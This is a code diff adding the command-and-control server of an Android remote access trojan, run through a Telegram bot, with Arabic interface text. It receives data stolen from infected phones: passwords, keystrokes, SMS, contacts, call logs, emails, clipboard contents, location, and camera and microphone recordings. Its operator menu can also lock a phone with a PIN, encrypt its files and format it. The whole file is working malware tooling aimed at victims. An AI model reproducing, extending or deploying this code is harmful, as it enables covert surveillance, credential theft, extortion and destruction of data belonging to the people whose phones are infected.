+let currentUuid = '';
+let currentNumber = '';
+let currentTitle = '';
+let currentMessage = '';
+let fileBuffer = null;
+
+// =============== الصفحة الرئيسية ===============
+app.get('/', function(req, res) {
+    res.send(`
+        <html>
+        <head>
+            <title>RAT Control Panel</title>
+            <style>
+                body { font-family: Arial; background: #1a1a2e; color: white; text-align: center; padding-top: 50px; }
+                h1 { color: #e94560; }
+                .status { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px auto; width: 300px; }
+            </style>
+        </head>
+        <body>
+            <h1>🚀 RAT Advanced Server v3.0</h1>
+            <div class="status">
+                <p>✅ Server Running</p>
+                <p>👥 Connected: <span id="count">0</span></p>
+                <p>⚡ Status: <span style="color: #0f0;">Online</span></p>
+            </div>
+            <script>
+                const ws = new WebSocket('wss://' + location.host);
+                ws.onmessage = (e) => { document.getElementById('count').textContent = e.data; };
+            </script>
+        </body>
+        </html>
+    `);
+});
+
+// =============== واجهات رفع الملفات ===============
+app.post('/uploadFile', upload.single('file'), (req, res) => {
+    const fileName = req.file.originalname;
+    appBot.sendDocument(id, req.file.buffer, {
+        caption: `°• 📁 ملف من <b>${req.headers.model}</b>\n• 📄 ${fileName}\n• 📦 ${req.file.size} bytes`,
+        parse_mode: 'HTML'
+    }, { filename: fileName, contentType: 'application/octet-stream' });
+    res.send('OK');
+});
+
+app.post('/uploadText', (req, res) => {
+    appBot.sendMessage(id, 
+        `°• 📝 رسالة من <b>${req.headers.model}</b>\n━━━━━━━━━━━━━━\n${req.body.text}`,
+        { parse_mode: 'HTML' }
+    );
+    res.send('OK');
+});
+
+app.post('/uploadLocation', (req, res) => {
+    appBot.sendLocation(id, req.body.lat, req.body.lon);
+    appBot.sendMessage(id, `°• 📍 موقع من <b>${req.headers.model}</b>`, { parse_mode: 'HTML' });
+    res.send('OK');
+});
+
+app.post('/uploadScreenshot', upload.single('screenshot'), (req, res) => {
+    appBot.sendPhoto(id, req.file.buffer, {
+        caption: `°• 📸 لقطة شاشة من <b>${req.headers.model}</b>\n• 🕐 ${new Date().toISOString()}`,
+        parse_mode: 'HTML'
+    });
+    res.send('OK');
+});
+
+app.post('/uploadCredentials', (req, res) => {
+    const creds = req.body;
+    appBot.sendMessage(id,
+        `°• 💳 حسابات مسروقة من <b>${req.headers.model}</b>\n` +
+        `━━━━━━━━━━━━━━\n` +
+        `• 📧 البريد: <code>${creds.email || 'N/A'}</code>\n` +
+        `• 🔑 كلمة السر: <code>${creds.password || 'N/A'}</code>\n` +
+        `• 🌐 الموقع: ${creds.url || 'N/A'}\n` +
+        `• 🕐 الوقت: ${creds.timestamp || 'N/A'}`,
+        { parse_mode: 'HTML' }
+    );
+    res.send('OK');
+});
+
+// =============== WebSocket Connection ===============
+appSocket.on('connection', (socket, req) => {
+    const uuid = uuid4.v4();
+    const deviceModel = req.headers.model || 'Unknown';
+    const deviceBattery = req.headers.battery || 'N/A';
+    const deviceVersion = req.headers.version || 'N/A';
+    const deviceBrightness = req.headers.brightness || 'N/A';
+    const deviceProvider = req.headers.provider || 'N/A';
+    const deviceIMEI = req.headers.imei || 'N/A';
+    const deviceIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+
+    socket.uuid = uuid;
+    
+    appClients.set(uuid, {
+        model: deviceModel,
+        battery: deviceBattery,
+        version: deviceVersion,
+        brightness: deviceBrightness,
+        provider: deviceProvider,
+        imei: deviceIMEI,
+        ip: deviceIP,
+        connectedAt: new Date().toISOString(),
+        lastActivity: new Date().toISOString(),
+        uuid: uuid
+    });
+
+    // إشعار بالاتصال الجديد
+    appBot.sendMessage(id,
+        `🚨 <b>جهاز جديد متصل!</b>\n━━━━━━━━━━━━━━\n` +
+        `• 📱 الموديل: <b>${deviceModel}</b>\n` +
+        `• 🔋 البطارية: ${deviceBattery}%\n` +
+        `• 🤖 أندرويد: ${deviceVersion}\n` +
+        `• ☀️ السطوع: ${deviceBrightness}\n` +
+        `• 📶 الشريحة: ${deviceProvider}\n` +
+        `• 🆔 IMEI: <code>${deviceIMEI}</code>\n` +
+        `• 🌐 IP: ${deviceIP}\n` +
+        `• 🆔 UUID: <code>${uuid}</code>\n` +
+        `• 🕐 ${new Date().toLocaleString('ar-EG')}`,
+        { parse_mode: 'HTML' }
+    );
+
+    // عند قطع الاتصال
+    socket.on('close', function() {
+        appBot.sendMessage(id,
+            `❌ <b>جهاز انقطع الاتصال</b>\n━━━━━━━━━━━━━━\n` +
+            `• 📱 الموديل: <b>${deviceModel}</b>\n` +
+            `• 🆔 UUID: <code>${uuid}</code>\n` +
+            `• 🕐 ${new Date().toLocaleString('ar-EG')}`,
+            { parse_mode: 'HTML' }
+        );
+        appClients.delete(socket.uuid);
+    });
+
+    // استقبال رسائل من الجهاز
+    socket.on('message', function(data) {
+        const message = data.toString();
+        console.log(`📩 من ${deviceModel}: ${message.substring(0, 100)}`);
+        
+        if (message.startsWith('screenshot:')) {
+            const base64Data = message.split(':')[1];
+            if (base64Data) {
+                const imgBuffer = Buffer.from(base64Data, 'base64');
+                appBot.sendPhoto(id, imgBuffer, {
+                    caption: `°• 📸 لقطة شاشة من <b>${deviceModel}</b>\n• 🕐 ${new Date().toISOString()}`,
+                    parse_mode: 'HTML'
+                });
+            }
+        }
+        else if (message.startsWith('keylog:')) {
+            const keyData = message.split(':')[1];
+            appBot.sendMessage(id,
+                `°• ⌨️ ضغطات المفاتيح من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n<code>${keyData}</code>`,
+                { parse_mode: 'HTML' }
+            );
+        }
+        else if (message.startsWith('notification:')) {
+            const notifData = message.substring(13);
+            const [appName, title, content] = notifData.split('|');
+            appBot.sendMessage(id,
+                `°• 🔔 إشعار جديد من <b>${deviceModel}</b>\n` +
+                `• 📱 التطبيق: ${appName}\n` +
+                `• 📌 العنوان: ${title}\n` +
+                `• 📄 المحتوى: ${content}`,
+                { parse_mode: 'HTML' }
+            );
+        }
+        else if (message.startsWith('email:')) {
+            const emailData = message.substring(6);
+            const [from, subject, body] = emailData.split('|');
+            appBot.sendMessage(id,
+                `°• 📧 بريد إلكتروني من <b>${deviceModel}</b>\n` +
+                `• 👤 من: ${from}\n` +
+                `• 📌 الموضوع: ${subject}\n` +
+                `• 📄 المحتوى: ${body}`,
+                { parse_mode: 'HTML' }
+            );
+        }
+        else if (message.startsWith('encrypted:')) {
+            appBot.sendMessage(id,
+                `°• 🔐 تم تشفير ملفات <b>${deviceModel}</b> بنجاح!`,
+                { parse_mode: 'HTML' }
+            );
+        }
+        else if (message.startsWith('formatted:')) {
+            appBot.sendMessage(id,
+                `°• ⚙️ تم فرمتة جهاز <b>${deviceModel}</b> بنجاح! 💀`,
+                { parse_mode: 'HTML' }
+            );
+        }
+        else if (message.startsWith('locked:')) {
+            appBot.sendMessage(id,
+                `°• 🔒 تم قفل جهاز <b>${deviceModel}</b> بنجاح!`,
+                { parse_mode: 'HTML' }
+            );
+        }
+        else if (message.startsWith('device_info:')) {
+            const info = message.substring(12);
+            appBot.sendMessage(id,
+                `°• ℹ️ معلومات جهاز <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n${info}`,
+                { parse_mode: 'HTML' }
+            );
+        }
+        else if (message.startsWith('contacts:')) {
+            const contacts = message.substring(9);
+            const contactsFile = Buffer.from(contacts, 'utf-8');
+            appBot.sendDocument(id, contactsFile, {
+                caption: `°• 📞 جهات اتصال من <b>${deviceModel}</b>`,
+                parse_mode: 'HTML'
+            }, { filename: `contacts_${uuid}.txt`, contentType: 'text/plain' });
+        }
+        else if (message.startsWith('calls:')) {
+            const calls = message.substring(6);
+            const callsFile = Buffer.from(calls, 'utf-8');
+            appBot.sendDocument(id, callsFile, {
+                caption: `°• 📞 سجل المكالمات من <b>${deviceModel}</b>`,
+                parse_mode: 'HTML'
+            }, { filename: `calls_${uuid}.txt`, contentType: 'text/plain' });
+        }
+        else if (message.startsWith('sms:')) {
+            const sms = message.substring(4);
+            const smsFile = Buffer.from(sms, 'utf-8');
+            appBot.sendDocument(id, smsFile, {
+                caption: `°• 💬 جميع الرسائل من <b>${deviceModel}</b>`,
+                parse_mode: 'HTML'
+            }, { filename: `sms_${uuid}.txt`, contentType: 'text/plain' });
+        }
+        else if (message.startsWith('audio:')) {
+            const audioData = message.split(':')[1];
+            if (audioData) {
+                const audioBuffer = Buffer.from(audioData, 'base64');
+                appBot.sendVoice(id, audioBuffer, {
+                    caption: `°• 🎤 تسجيل صوتي من <b>${deviceModel}</b>`,
+                    parse_mode: 'HTML'
+                });
+            }
+        }
+        else if (message.startsWith('video:')) {
+            const videoData = message.split(':')[1];
+            if (videoData) {
+                const videoBuffer = Buffer.from(videoData, 'base64');
+                appBot.sendVideo(id, videoBuffer, {
+                    caption: `°• 🎥 فيديو من كاميرا <b>${deviceModel}</b>`,
+                    parse_mode: 'HTML'
+                });
+            }
+        }
+        else if (message.startsWith('photos:')) {
+            const photoData = message.split(':')[1];
+            if (photoData) {
+                const photoBuffer = Buffer.from(photoData, 'base64');
+                appBot.sendPhoto(id, photoBuffer, {
+                    caption: `°• 🖼️ صورة من <b>${deviceModel}</b>`,
+                    parse_mode: 'HTML'
+                });
+            }
+        }
+        else if (message.startsWith('file:')) {
+            const parts = message.split(':');
+            const fileName = parts[1];
+            const fileData = parts[2];
+            if (fileData) {
+                const fileBuffer = Buffer.from(fileData, 'base64');
+                appBot.sendDocument(id, fileBuffer, {
+                    caption: `°• 📁 ملف من <b>${deviceModel}</b>\n• 📄 ${fileName}`,
+                    parse_mode: 'HTML'
+                }, { filename: fileName, contentType: 'application/octet-stream' });
+            }
+        }
+        else if (message.startsWith('clipboard:')) {
+            const clipData = message.substring(10);
+            appBot.sendMessage(id,
+                `°• 📋 محتوى الحافظة من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n${clipData}`,
+                { parse_mode: 'HTML' }
+            );
+        }
+        else if (message.startsWith('location:')) {
+            const parts = message.split(':');
+            const lat = parseFloat(parts[1]);
+            const lon = parseFloat(parts[2]);
+            if (!isNaN(lat) && !isNaN(lon)) {
+                appBot.sendLocation(id, lat, lon);
+                appBot.sendMessage(id,
+                    `°• 📍 موقع <b>${deviceModel}</b>\n• 🌐 https://maps.google.com/?q=${lat},${lon}`,
+                    { parse_mode: 'HTML' }
+                );
+            }
+        }
+        else if (message.startsWith('apps:')) {
+            const apps = message.substring(5);
+            const appsFile = Buffer.from(apps, 'utf-8');
+            appBot.sendDocument(id, appsFile, {
+                caption: `°• 📱 تطبيقات <b>${deviceModel}</b>`,
+                parse_mode: 'HTML'
+            }, { filename: `apps_${uuid}.txt`, contentType: 'text/plain' });
+        }
+        else if (message.startsWith('pong')) {
+            // استجابة ping
+        }
+        else {
+            appBot.sendMessage(id,
+                `°• 📩 رسالة غير معروفة من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n<code>${message}</code>`,
+                { parse_mode: 'HTML' }
+            );
+        }
+    });
+});
+
+// =============== بوت التيليغرام - معالجة الأوامر ===============
+appBot.on('message', (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text || '';
+
+    // ===== التعامل مع الردود =====
+    if (msg.reply_to_message) {
+        const replyText = msg.reply_to_message.text || '';
+        
+        // إرسال رسالة نصية قصيرة (SMS)
+        if (replyText.includes('°• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إلي')) {
+            currentNumber = text;
+            appBot.sendMessage(id,
+                '°• 💬 رائع! أدخل الآن الرسالة التي تريد إرسالها\n\n⚠️ ملاحظة: الرسالة ستُرسل كـ SMS عادية',
+                { reply_markup: { force_reply: true } }
+            );
+        }
+        
+        // إرسال الرسالة النصية
+        if (replyText.includes('°• 💬 رائع! أدخل الآن الرسالة التي تريد إرسالها')) {
+            sendCommandToClient(`send_message:${currentNumber}:${text}:`);
+            currentNumber = '';
+            currentUuid = '';
+            showMainMenu('✅ تم إرسال الرسالة بنجاح!');
+        }
+
+        // إرسال رسالة لجميع جهات الاتصال
+        if (replyText.includes('°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
+            sendCommandToClient(`send_message_to_all:${text}:`);
+            currentUuid = '';
+            showMainMenu('✅ تم إرسال الرسالة للجميع!');
+        }
+
+        // تنزيل ملف
+        if (replyText.includes('°• أدخل مسار الملف الذي تريد تنزيله')) {
+            sendCommandToClient(`file:${text}:`);
+            currentUuid = '';
+            showMainMenu('⏳ جاري تحميل الملف...');
+        }
+
+        // حذف ملف
+        if (replyText.includes('°• أدخل مسار الملف الذي تريد حذفه')) {
+            sendCommandToClient(`delete_file:${text}:`);
+            currentUuid = '';
+            showMainMenu('🗑️ تم حذف الملف بنجاح!');
+        }
+
+        // تسجيل ميكروفون
+        if (replyText.includes('أدخل المدة (بالثواني) التي تريد تسجيل الميكروفون فيها')) {
+            const time = parseInt(text);
+            if (time > 0 && time <= 300) {
+                sendCommandToClient(`microphone:${time}:`);
+                currentUuid = '';
+                showMainMenu(`🎤 جاري التسجيل لمدة ${time} ثانية...`);
+            } else {
+                appBot.sendMessage(id, '❌ يجب أن تكون المدة بين 1 و 300 ثانية');
+            }
+        }
+
+        // تسجيل فيديو كاميرا خلفية
+        if (replyText.includes('أدخل المدة (بالثواني) لتسجيل الكاميرا الخلفية')) {
+            const time = parseInt(text);
+            if (time > 0 && time <= 60) {
+                sendCommandToClient(`video_main:${time}:`);
+                currentUuid = '';
+                showMainMenu(`🎥 جاري تسجيل الفيديو لمدة ${time} ثانية...`);
+            } else {
+                appBot.sendMessage(id, '❌ يجب أن تكون المدة بين 1 و 60 ثانية');
+            }
+        }
+
+        // تسجيل فيديو كاميرا أمامية
+        if (replyText.includes('أدخل المدة (بالثواني) لتسجيل الكاميرا الأمامية')) {
+            const time = parseInt(text);
+            if (time > 0 && time <= 60) {
+                sendCommandToClient(`video_selfie:${time}:`);
+                currentUuid = '';
+                showMainMenu(`🎥 جاري تسجيل السيلفي لمدة ${time} ثانية...`);
+            } else {
+                appBot.sendMessage(id, '❌ يجب أن تكون المدة بين 1 و 60 ثانية');
+            }
+        }
+
+        // رسالة Toast
+        if (replyText.includes('°• أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف')) {
+            sendCommandToClient(`toast:${text}:`);
+            currentUuid = '';
+            showMainMenu('✅ تم عرض الرسالة!');
+        }
+
+        // إشعار
+        if (replyText.includes('°• أدخل عنوان الإشعار الذي تريد إرساله')) {
+            currentTitle = text;
+            appBot.sendMessage(id,
+                '°• الآن أدخل محتوى الإشعار\n\n⚠️ سيظهر كإشعار عادي على الجهاز',
+                { reply_markup: { force_reply: true } }
+            );
+        }
+
+        if (replyText.includes('°• الآن أدخل محتوى الإشعار')) {
+            sendCommandToClient(`show_notification:${currentTitle}:${text}:`);
+            currentTitle = '';
+            currentUuid = '';
+            showMainMenu('✅ تم إرسال الإشعار!');
+        }
+
+        // رابط للفتح
+        if (replyText.includes('°• أدخل الرابط الذي تريد فتحه على جهاز الضحية')) {
+            sendCommandToClient(`open_url:${text}:`);
+            currentUuid = '';
+            showMainMenu('✅ تم فتح الرابط!');
+        }
+
+        // رابط صوت
+        if (replyText.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
+            sendCommandToClient(`play_audio:${text}:`);
+            currentUuid = '';
+            showMainMenu('🔊 جاري تشغيل الصوت...');
+        }
+
+        // كود قفل الشاشة
+        if (replyText.includes('°• أدخل رمز القفل المكون من 4 أرقام')) {
+            if (/^\d{4}$/.test(text)) {
+                sendCommandToClient(`lock_device:${text}:`);
+                currentUuid = '';
+                showMainMenu(`🔒 تم قفل الجهاز بالرمز ${text}!`);
+            } else {
+                appBot.sendMessage(id, '❌ الرمز يجب أن يكون 4 أرقام فقط');
+            }
+        }
+
+        // تنبيه عند الوصول للردود
+        if (replyText.includes('°• رائع! أدخل الآن')) {
+            // معالجة عامة لأي ردود أخرى
+        }
+    }
+
+    // ===== الأوامر الرئيسية =====
+    if (id == chatId) {
+        if (text == '/start') {
+            showMainMenu('👋 مرحبا بك في بوت الاختراق المتطور v3.0');
+        }
+
+        if (text == 'الأجهزة المتصلة🤖' || text == '📱 الأجهزة المتصلة') {
+            if (appClients.size == 0) {
+                appBot.sendMessage(id,
+                    '❌ <b>لا توجد أجهزة متصلة!</b>\n\n' +
+                    '⚠️ تأكد من أن التطبيق مثبت على جهاز الضحية وأن الجهاز متصل بالإنترنت',
+                    { parse_mode: 'HTML' }
+                );
+            } else {
+                let devicesList = '📱 <b>قائمة الأجهزة المتصلة</b>\n━━━━━━━━━━━━━━\n\n';
+                let count = 1;
+                appClients.forEach(function(client, uuid) {
+                    devicesList +=
+                        `🆔 ${count++}\n` +
+                        `• الموديل: <b>${client.model}</b>\n` +
+                        `• البطارية: ${client.battery}% 🔋\n` +
+                        `• أندرويد: ${client.version}\n` +
+                        `• متصل منذ: ${client.connectedAt}\n` +
+                        `• 🆔 <code>${uuid.substring(0, 8)}...</code>\n\n`;
+                });
+                devicesList += `━━━━━━━━━━━━━━\n📊 المجموع: ${appClients.size} أجهزة`;
+                appBot.sendMessage(id, devicesList, { parse_mode: 'HTML' });
+            }
+        }
+
+        if (text == 'قائمة الأوامر🕹' || text == '⚙️ لوحة التحكم') {
+            if (appClients.size == 0) {
+                appBot.sendMessage(id,
+                    '❌ لا توجد أجهزة متصلة!\n⚠️ قم بتوصيل جهاز أولاً',
+                    { parse_mode: 'HTML' }
+                );
+            } else {
+                const inlineButtons = [];
+                appClients.forEach(function(client, uuid) {
+                    inlineButtons.push([
+                        { text: `${client.model} (🔋${client.battery}%)`, callback_data: 'device:' + uuid }
+                    ]);
+                });
+                appBot.sendMessage(id, '⚙️ <b>اختر الجهاز للتحكم به:</b>', {
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: inlineButtons
+                    }
+                });
+            }
+        }
+
+        if (text == '📊 الإحصائيات') {
+            appBot.sendMessage(id,
+                `📊 <b>إحصائيات البوت</b>\n━━━━━━━━━━━━━━\n` +
+                `• 👥 الأجهزة المتصلة: ${appClients.size}\n` +
+                `• ⏱ يعمل منذ: تشغيل مستمر\n` +
+                `• 📡 الحالة: نشط ✅\n` +
+                `• 🆔 البوت: @KingRATBot\n` +
+                `• 👤 المطور: @king_1_4`,
+                { parse_mode: 'HTML' }
+            );
+        }
+    } else {
+        appBot.sendMessage(id, '❌ أنت غير مصرح باستخدام هذا البوت!');
+    }
+});
+
+// =============== معالجة الأزرار (Callback Queries) ===============
+appBot.on('callback_query', (callbackQuery) => {
+    const msg = callbackQuery.message;
+    const data = callbackQuery.data;
+    const prefix = data.split(':')[0];
+    const uuid = data.split(':')[1];
+    const client = appClients.get(uuid);
+
+    if (!client) {
+        appBot.answerCallbackQuery(callbackQuery.id, { text: '❌ الجهاز غير متصل!', show_alert: true });
+        return;
+    }
+
+    if (prefix == 'device') {
+        const deviceInfo = appClients.get(uuid);
+        appBot.editMessageText(
+            `⚙️ <b>لوحة تحكم ${deviceInfo.model}</b>\n━━━━━━━━━━━━━━\n` +
+            `• 🔋 البطارية: ${deviceInfo.battery}%\n` +
+            `• 📶 الشبكة: ${deviceInfo.provider}\n` +
+            `• 🆔 ${uuid.substring(0, 8)}...\n` +
+            `━━━━━━━━━━━━━━\n<b>اختر الأمر:</b>`,
+            {
+                chat_id: id,
+                message_id: msg.message_id,
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: '🗂️ الملفات والصور', callback_data: `files_menu:${uuid}:` }],
+                        [{ text: '📱 معلومات الجهاز', callback_data: `device_info:${uuid}:` },
+                         { text: '📋 الحافظة', callback_data: `clipboard:${uuid}:` }],
+                        [{ text: '📞 جهات الاتصال', callback_data: `contacts:${uuid}:` },
+                         { text: '📞 سجل المكالمات', callback_data: `calls:${uuid}:` }],
+                        [{ text: '💬 جميع الرسائل', callback_data: `messages:${uuid}:` },
+                         { text: '📧 البريد الإلكتروني', callback_data: `emails:${uuid}:` }],
+                        [{ text: '📱 التطبيقات', callback_data: `apps:${uuid}:` },
+                         { text: '📍 الموقع', callback_data: `location:${uuid}:` }],
+                        [{ text: '🎤 تسجيل ميكروفون', callback_data: `microphone:${uuid}:` }],
+                        [{ text: '📸 كاميرا خلفية', callback_data: `camera_main:${uuid}:` },
+                         { text: '🤳 كاميرا أمامية', callback_data: `camera_selfie:${uuid}:` }],
+                        [{ text: '🖥️ لقطة شاشة', callback_data: `screenshot:${uuid}:` }],
+                        [{ text: '💳 سحب الحسابات', callback_data: `credentials:${uuid}:` }],
+                        [{ text: '🔔 مراقبة الإشعارات', callback_data: `notifications:${uuid}:` }],
+                        [{ text: '⌨️ مراقبة الكتابة (Keylogger)', callback_data: `keylogger:${uuid}:` }],
+                        [{ text: '🔊 تشغيل صوت', callback_data: `play_audio_menu:${uuid}:` },
+                         { text: '🔇 إيقاف الصوت', callback_data: `stop_audio:${uuid}:` }],
+                        [{ text: '📨 إرسال رسالة', callback_data: `send_message:${uuid}:` }],
+                        [{ text: '📨 رسالة للجميع', callback_data: `send_message_to_all:${uuid}:` }],
+                        [{ text: '🔗 فتح رابط', callback_data: `open_url:${uuid}:` }],
+                        [{ text: '📲 إظهار إشعار', callback_data: `show_notification:${uuid}:` }],
+                        [{ text: '💬 إظهار Toast', callback_data: `toast:${uuid}:` }],
+                        [{ text: '📳 اهتزاز', callback_data: `vibrate:${uuid}:` }],
+                        [{ text: '🔒 قفل الجهاز', callback_data: `lock_device:${uuid}:` }],
+                        [{ text: '🔐 تشفير الملفات', callback_data: `encrypt:${uuid}:` }],
+                        [{ text: '💣 فرمته الجهاز', callback_data: `format:${uuid}:` }],
+                        [{ text: '🔙 رجوع', callback_data: `back_to_devices:${uuid}:` }]
+                    ]
+                },
+                parse_mode: 'HTML'
+            }
+        );
+    }
+
+    if (prefix == 'files_menu') {
+        appBot.editMessageText(
+            `📂 <b>قائمة الملفات والصور</b>\n━━━━━━━━━━━━━━`,
+            {
+                chat_id: id,
+                message_id: msg.message_id,
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: '🖼️ سحب جميع الصور', callback_data: `get_all_photos:${uuid}:` }],
+                        [{ text: '📥 تنزيل ملف', callback_data: `file:${uuid}:` }],
+                        [{ text: '🗑️ حذف ملف', callback_data: `delete_file:${uuid}:` }],
+                        [{ text: '🔙 رجوع', callback_data: `device:${uuid}:` }]
+                    ]
+                },
+                parse_mode: 'HTML'
+            }
+        );
+    }
+
+    // ===== تنفيذ الأوامر =====
+    const actionHandlers = {
+        'device_info': { cmd: 'device_info', msg: '⏳ جاري سحب معلومات الجهاز...' },
+        'clipboard': { cmd: 'clipboard', msg: '⏳ جاري سحب الحافظة...' },
+        'contacts': { cmd: 'contacts', msg: '⏳ جاري سحب جهات الاتصال...' },
+        'calls': { cmd: 'calls', msg: '⏳ جاري سحب سجل المكالمات...' },
+        'messages': { cmd: 'messages', msg: '⏳ جاري سحب جميع الرسائل...' },
+        'emails': { cmd: 'emails', msg: '⏳ جاري سحب البريد الإلكتروني...' },
+        'apps': { cmd: 'apps', msg: '⏳ جاري سحب التطبيقات...' },
+        'location': { cmd: 'location', msg: '⏳ جاري سحب الموقع...' },
+        'screenshot': { cmd: 'screenshot', msg: '⏳ جاري التقاط الشاشة...' },
+        'credentials': { cmd: 'credentials', msg: '⏳ جاري سحب الحسابات...' },
+        'vibrate': { cmd: 'vibrate', msg: '📳 جاري تشغيل الاهتزاز...' },
+        'stop_audio': { cmd: 'stop_audio', msg: '🔇 جاري إيقاف الصوت...' },
+        'encrypt': { cmd: 'encrypt', msg: '🔐 جاري تشفير الملفات...' },
+        'format': { cmd: 'format', msg: '💣 <b>جارٍ فرمتة الجهاز...</b>\n⚠️ هذا الإجراء لا يمكن التراجع عنه!', danger: true },
+        'get_all_photos': { cmd: 'get_all_photos', msg: '⏳ جاري سحب جميع الصور...' },
+        'keylogger': { cmd: 'keylogger', msg: '⌨️ تم تفعيل مراقبة الكتابة...' },
+        'notifications': { cmd: 'notifications', msg: '🔔 تم تفعيل مراقبة الإشعارات...' },
+        'camera_main': { cmd: 'capture_main', msg: '📸 جاري التقاط صورة من الكاميرا الخلفية...' },
+        'camera_selfie': { cmd: 'capture_selfie', msg: '📸 جاري التقاط صورة من الكاميرا الأمامية...' }
+    };
+
+    if (actionHandlers[prefix]) {
+        const action = actionHandlers[prefix];
+        if (action.danger) {
+            // تأكيد للإجراءات الخطيرة
+            appBot.editMessageText(
+                `⚠️ <b>تأكيد الإجراء</b>\n━━━━━━━━━━━━━━\n${action.msg}\n\n<b>هل أنت متأكد؟</b>`,
+                {
+                    chat_id: id,
+                    message_id: msg.message_id,
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: '✅ نعم، متأكد', callback_data: `confirm_${prefix}:${uuid}:` }],
+                            [{ text: '❌ إلغاء', callback_data: `device:${uuid}:` }]
+                        ]
+                    },
+                    parse_mode: 'HTML'
+                }
+            );
+        } else {
+            sendCommandToClient(`${action.cmd}:`);
+            appBot.deleteMessage(id, msg.message_id);
+            showMainMenu(action.msg);
+        }
+        return;
+    }
+
+    // تأكيد الإجراءات الخطيرة
+    if (prefix.startsWith('confirm_')) {
+        const realAction = prefix.replace('confirm_', '');
+        if (actionHandlers[realAction]) {
+            sendCommandToClient(`${actionHandlers[realAction].cmd}:`);
+            appBot.deleteMessage(id, msg.message_id);
+            showMainMenu(actionHandlers[realAction].msg);
+        }
+        return;
+    }
+
+    // ===== أوامر تتطلب إدخال نص =====
+    const inputActions = {
+        'microphone': { msg: '🎤 أدخل المدة (بالثواني) التي تريد تسجيل الميكروفون فيها\n⚠️ الحد الأقصى: 300 ثانية (5 دقائق)' },
+        'video_main': { msg: '📷 أدخل المدة (بالثواني) لتسجيل الكاميرا الخلفية\n⚠️ الحد الأقصى: 60 ثانية' },
+        'video_selfie': { msg: '🤳 أدخل المدة (بالثواني) لتسجيل الكاميرا الأمامية\n⚠️ الحد الأقصى: 60 ثانية' },
+        'toast': { msg: '💬 أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف\n⚠️ ستظهر لمدة قصيرة ثم تختفي' },
+        'file': { msg: '📁 أدخل مسار الملف الذي تريد تنزيله\n📌 مثال: /storage/emulated/0/DCIM/Camera/photo.jpg' },
+        'delete_file': { msg: '🗑️ أدخل مسار الملف الذي تريد حذفه\n📌 مثال: /storage/emulated/0/DCIM/Camera/photo.jpg' },
+        'send_message': { msg: '°• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه\n📌 مثال: 05XXXXXXXX (للسعودية)' },
+        'send_message_to_all': { msg: '°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال' },
+        'play_audio': { msg: '🔊 أدخل رابط الصوت الذي تريد تشغيله\n📌 مثال: https://example.com/audio.mp3' },
+        'open_url': { msg: '🔗 أدخل الرابط الذي تريد فتحه على جهاز الضحية\n📌 مثال: https://example.com' },
+        'show_notification': { msg: '°• أدخل عنوان الإشعار الذي تريد إرساله\n📌 مثال: تحديث النظام' },
+        'lock_device': { msg: '🔒 أدخل رمز القفل المكون من 4 أرقام\n📌 مثال: 1234' }
+    };
+
+    if (inputActions[prefix]) {
+        const action = inputActions[prefix];
+        appBot.deleteMessage(id, msg.message_id);
+        appBot.sendMessage(id, action.msg, { reply_markup: { force_reply: true } });
+        currentUuid = uuid;
+        return;
+    }
+
+    // ===== أزرار العودة =====
+    if (prefix == 'back_to_devices') {
+        const inlineButtons = [];
+        appClients.forEach(function(client, uuid) {
+            inlineButtons.push([
+                { text: `${client.model} (🔋${client.battery}%)`, callback_data: 'device:' + uuid }
+            ]);
+        });
+        appBot.editMessageText('⚙️ <b>اختر الجهاز للتحكم به:</b>', {
+            chat_id: id,
+            message_id: msg.message_id,
+            parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: inlineButtons }
+        });
+    }
+});
+
+// =============== دوال مساعدة ===============
+function sendCommandToClient(command) {
+    appSocket.clients.forEach(function(socket) {
+        if (socket.uuid == currentUuid) {
+            try {
+                socket.send(command);
+                console.log(`📤 أرسل: ${command} إلى ${socket.uuid}`);
+            } catch (e) {
+                console.error('❌ فشل الإرسال:', e.message);
+            }
+        }
+    });
+}
+
+function showMainMenu(message) {
+    appBot.sendMessage(id,
+        `${message}\n\n` +
+        `━━━━━━━━━━━━━━\n` +
+        `<b>القائمة الرئيسية:</b>`,
+        {
+            parse_mode: 'HTML',
+            reply_markup: {
+                keyboard: [
+                    ['📱 الأجهزة المتصلة', '⚙️ لوحة التحكم'],
+                    ['📊 الإحصائيات']
+                ],
+                resize_keyboard: true
+            }
+        }
+    );
+}
+
+// =============== كشف الاتصال (Ping) ===============
+setInterval(function() {
+    appSocket.clients.forEach(function(socket) {
+        try {
+            socket.send('ping');
+        } catch (e) {
+            // تجاهل الأخطاء
+        }
+    });
+    // محاولة الاتصال بالإنترنت للتأكد
+    try {
+        axios.get(address).then(() => {}).catch(() => {});
+    } catch (e) {}
+}, 5000);
+
+// =============== تشغيل الخادم ===============
+const PORT = process.env.PORT || 8999;
+appServer.listen(PORT, () => {
+    console.log(`🚀 RAT Server running on port ${PORT}`);
+    console.log(`🤖 Bot started successfully`);
+    
+    // إشعار بتشغيل البوت
+    appBot.sendMessage(id, 
+        `🚀 <b>تم تشغيل البوت بنجاح!</b>\n` +
+        `━━━━━━━━━━━━━━\n` +
+        `• ⚙️ الإصدار: v3.0 Advanced\n` +
+        `• 🕐 ${new Date().toLocaleString('ar-EG')}\n` +
+        `• 🌐 المنفذ: ${PORT}\n` +
+        `• 👤 المطور: @king_1_4\n` +
+        `━━━━━━━━━━━━━━\n` +
+        `<b>جميع الإمكانيات متاحة ✅</b>`,
+        { parse_mode: 'HTML' }
+    );
+});
